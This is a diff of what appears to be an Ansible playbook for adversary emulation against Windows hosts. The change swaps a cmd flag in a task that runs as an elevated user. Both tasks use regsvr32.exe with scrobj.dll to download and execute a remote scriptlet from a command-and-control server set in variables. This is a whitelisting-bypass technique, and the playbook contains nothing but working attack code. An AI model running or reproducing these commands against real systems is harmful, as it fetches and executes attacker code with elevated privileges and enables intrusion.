@@ -6,7 +6,7 @@
   tasks:
     - name: Run regedit.exe locally (on target node) as SYSTEM and interactively
       win_shell: |
-        Start-Process cmd \"/k regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll" -Verb RunAs
+        Start-Process cmd \"/c regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll\" -Verb RunAs
     - name: download and execute
       win_command: |
         regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
